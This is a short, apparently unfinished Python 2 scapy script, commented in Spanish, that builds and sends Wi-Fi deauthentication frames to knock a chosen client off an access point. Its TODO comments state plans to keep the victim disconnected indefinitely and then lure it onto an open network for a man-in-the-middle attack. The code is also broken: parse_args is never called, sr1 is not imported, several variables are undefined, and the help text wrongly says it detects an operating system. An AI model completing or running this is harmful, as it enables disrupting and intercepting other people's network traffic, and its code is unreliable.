#!/usr/bin/python

from scapy.layers.dot11 import Dot11Deauth, Dot11, RadioTap

import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para detectar el OS de un sistema")
parser.add_argument('-V', '--MACV', help="MAC de usuario a desautenticar", type=int )
parser.add_argument('-G', '--MACG', help="MAC del acces point")
parser.add_argument('-I', '--Interface', help="La interfaz de red")
parser.add_argument('-n', '--Iterations', help="Numero de paquetes Death")

args = parser.parse_args

request = RadioTap()/Dot11(addr1=args.V,addr2=args.MACG,addr3=args.MACG)/Dot11Deauth()

#FAlTA:hacer ciclo endefinido pra mantener  victima desautenticada permanentemente

response = sr1(request)
print 'Desautenticando  ' + V + 'Conectado a ' + G + ' por la interfaz ' + I 


#FALTA:Autenticar a victima  en red  abierta, para hacer MITM

